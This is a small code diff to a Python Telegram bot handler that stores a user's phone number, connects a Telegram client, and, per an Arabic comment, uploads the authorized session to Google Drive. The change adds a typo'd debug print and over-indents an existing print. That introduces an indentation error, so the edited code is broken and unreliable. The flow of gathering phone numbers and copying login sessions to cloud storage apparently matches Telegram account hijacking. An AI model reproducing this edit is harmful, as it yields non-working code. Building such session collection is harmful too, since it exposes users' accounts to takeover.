@@ -120,8 +120,9 @@ async def process_phone(update, context):
     phone_numbers[user_id] = phone_number
 
     try:
+        print("sttart here")
         await client.connect()
-        print("تم إنشاء الاتصال بـ Telegram.")
+            print("تم إنشاء الاتصال بـ Telegram.")
         if await client.is_user_authorized():
             print("المستخدم مصرح له مسبقًا.")
             # رفع الجلسة إلى Google Drive
